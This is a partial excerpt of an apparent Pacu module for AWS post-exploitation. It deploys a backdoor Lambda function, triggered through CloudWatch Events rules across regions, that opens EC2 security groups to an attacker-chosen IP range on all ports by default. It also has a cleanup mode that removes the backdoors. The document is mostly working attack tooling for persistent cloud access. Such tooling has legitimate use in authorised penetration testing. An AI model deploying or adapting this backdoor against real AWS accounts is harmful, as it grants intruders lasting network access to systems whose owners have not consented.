...
parser.add_argument(
    ...
    required=False,
    default=None,
    help='One or more (comma separated) AWS regions to create the backdoor Lambda function in, in the format "us-east-1". Defaults to all session regions.',
)
parser.add_argument(
    "--ip-range",
    required=False,
    default=None,
    help="The IP range to allow backdoor access to. This would most likely be your own IP address in the format: 127.0.0.1/32",
)
parser.add_argument(
    "--port-range",
    required=False,
    default="0-65535",
    help="The port range to give yourself access to in the format: starting-ending (ex: 200-800). By default, all ports are allowed (0-65535).",
)
parser.add_argument(
    "--protocol",
    required=False,
    default="tcp",
    help="The protocol for the IP range specified. Options are: TCP, UDP, ICMP, or ALL. The default is TCP. WARNING: When supplying ALL, AWS will automatically allow traffic on all ports, regardless of the range specified. More information is available here: https://boto3.readthedocs.io/en/latest/reference/services/ec2.html#EC2.Client.authorize_security_group_ingress",
)
parser.add_argument(
    "--cleanup",
    required=False,
    default=False,
    action="store_true",
    help="Run the module in cleanup mode. This will remove any known backdoors that the module added from the account.",
)
...
def main(args, pacu_main):
    ...
    CREATED_CLOUDWATCH_EVENTS_RULES_PATH = (
        MODULE_SESSION_PATH / "created-cloudwatch-events-rules.txt"
    )
    ...
    if args.cleanup:
        ...
        if created_cwe_rules:
            ...
            for rule in created_cwe_rules:
                ...
                try:
                    client.remove_targets(Rule=name, Ids=["0"])
    ...
    target_role_arn = input(
        "  What role should be used? Note: The role should allow Lambda to assume it and have at least the EC2 AuthorizeSecurityGroupIngress permission. Enter the ARN now or just press enter to enumerate a list of possible roles to choose from: "
    )
    ...
    source_code = (
        source_code.replace("FROM_PORT", from_port)
        .replace("TO_PORT", to_port)
        .replace("IP_RANGE", args.ip_range)
        .replace("IP_PROTOCOL", args.protocol)
    )
    ...
    try:
        ...
        with zipfile.ZipFile(
            LAMBDA_FUNCTION_ZIP_PATH, "w", zipfile.ZIP_DEFLATED
        ) as zip_file:
    ...
    for region in regions:
        ...
        try:
            ...
            created_resources["LambdaFunctions"].append(
            ...
            response = client.put_targets(
                Rule=function_name, Targets=[{"Id": "0", "Arn": lambda_arn}]
            )
            if response["FailedEntryCount"] > 0:
                print(
                    "Failed to add the Lambda function as a target to the CloudWatch rule. Failed entries:"
                )
                print(response["FailedEntries"])
            else:
                print("  Added Lambda target to CloudWatch Events rule.")
                data["successes"] += 1
                created_resources["CWERules"].append(
                    "{}@{}".format(function_name, region)
                )
        except ClientError as error:
            code = error.response["Error"]["Code"]
    ...
    print(
        "Warning: Your backdoor will not execute if the account does not have an active CloudTrail trail in the region it was deployed to."
    )
